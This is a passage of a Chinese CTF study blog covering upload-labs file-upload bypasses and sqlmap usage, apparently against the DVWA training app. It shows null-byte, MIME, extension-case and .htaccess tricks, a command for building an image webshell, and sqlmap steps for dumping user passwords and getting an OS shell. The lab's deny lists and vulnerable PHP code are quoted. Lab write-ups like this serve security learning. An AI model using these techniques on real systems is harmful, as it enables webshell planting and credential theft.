<p><code>www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php</code>其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php</p>
<p><img src="https://i.loli.net/2020/11/30/TwSKHkqZFC78uRd.png" alt></p>
<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>这题与上题利用的原理相同</p>
<p>但是这里要使用 00的二进制形式</p>
<p><img src="/2020/09/18/upload2/13.png" alt></p>
<p><img src="/2020/09/18/upload2/13-1.png" alt></p>
<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>明确说了上传图片木马</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;
    <span class="hljs-variable">$file</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);
    <span class="hljs-variable">$bin</span> = fread(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span>
    fclose(<span class="hljs-variable">$file</span>);
    <span class="hljs-variable">$strInfo</span> = @unpack(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);    
    <span class="hljs-variable">$typeCode</span> = intval(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);    
    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    
    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      
        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;
            <span class="hljs-keyword">break</span>;        
        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:            
            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;
        &#125;    
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;
&#125;</code></pre>

<p><strong>GIF89a</strong> 是GIF图片的文件头 ，是为了绕过gif文件的检查</p>
<p><strong>图片木马的制作</strong></p>
<p>桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马</p>
<p><img src="https://i.loli.net/2020/11/30/vXmVIJ3OEzcnrsL.png" alt></p>
<p><code>copy 2.jpg /b + 1.php /a webshell.jpg</code></p>
<p><img src="https://i.loli.net/2020/11/30/KWgpdyf8xoFqcMn.png" alt></p>
<p><strong>未完待续。。。</strong></p>
]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>双写绕过</tag>
        <tag>00截断</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>

<p>第一步:</p>
<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
<p>第六步:</p>
<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
<p>group by *</p>
<p>利用内置函数暴数据库信息</p>
<p>version() 查看数据库版本</p>
<p>database() 查看当前数据库名</p>
<p>user() 查看当前用户</p>
<p>查看表：</p>
<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>uploads-labs</title>
    <url>/2020/09/16/uploads/</url>
    <content><![CDATA[<h1 id="upload-labs-1-10"><a href="#upload-labs-1-10" class="headerlink" title="upload-labs 1-10"></a>upload-labs 1-10</h1><span id="more"></span>



<h2 id="pass1"><a href="#pass1" class="headerlink" title="pass1"></a>pass1</h2><p>直接抓包修改文件后缀名为jpg,png,gif即可</p>
<h2 id="pass2"><a href="#pass2" class="headerlink" title="pass2"></a>pass2</h2><p>查看源码</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/jpeg&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>) || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/gif&#x27;</span>))</code></pre>

<p>这段代码说明是对文件的<code>MIME</code>类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 <code>&#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;</code>,这三个类型都为图片</p>
<p>抓包修改MIME即可</p>
<p>知识点补充：</p>
<p> <strong>MIME类型对大小写不敏感，但是传统写法都是小写。</strong> </p>
<pre><code class="hljs applescript"><span class="hljs-built_in">text</span>/plain
<span class="hljs-built_in">text</span>/html
image/jpeg
image/png
audio/mpeg
audio/ogg
audio/*
video/mp4
<span class="hljs-built_in">application</span>/*
<span class="hljs-built_in">application</span>/json
<span class="hljs-built_in">application</span>/javascript
<span class="hljs-built_in">application</span>/ecmascript
<span class="hljs-built_in">application</span>/octet-stream</code></pre>

<p>更详细的解释，</p>
<h2 id="pass3"><a href="#pass3" class="headerlink" title="pass3"></a>pass3</h2><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);</code></pre>

<p>只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过</p>
<h2 id="pass4"><a href="#pass4" class="headerlink" title="pass4"></a>pass4</h2><p><strong>.htaccess</strong>文件的作用</p>
<blockquote>
<ul>
<li>URL重写、自定义错误页面</li>
<li>MIME类型配置</li>
<li>访问权限控制等</li>
<li>主要体现在伪静态的应用</li>
<li>图片防盗链</li>
<li>自定义404错误页面</li>
<li>阻止/允许特定IP/IP段</li>
<li>目录浏览与主页</li>
<li>禁止访问指定文件类型</li>
<li>文件密码保护</li>
</ul>
</blockquote>
<pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;</span>
<span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php
<span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre>

<p>这几句代码的意思：</p>
<p>通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，</p>
<p>无论扩展名是什么(没有也行)，都以php的方式来解析</p>
<p>上传完.htaccess文件后直接上传一个 <code>1.jpg</code>即可</p>
<h2 id="pass5"><a href="#pass5" class="headerlink" title="pass5"></a>pass5</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>本题与第十题完全一样，详细解答见第十题</p>
<p><img src="/2020/09/16/uploads/5.png" alt></p>
<h2 id="pass6"><a href="#pass6" class="headerlink" title="pass6"></a>pass6</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>

        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>仔细查看源码会发现少了下面的这段代码</p>
<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span></code></pre>

<p>这里就可以大小写绕过。将文件后缀名改为<code>.pHp , .PHP</code>等</p>
<h2 id="pass7"><a href="#pass7" class="headerlink" title="pass7"></a>pass7</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
        
        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
            &#125;
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传&#x27;</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
    &#125;
&#125;</code></pre>

<p>跟第六关对比发现少了这句话</p>
<pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
<p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" alt></p>
<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
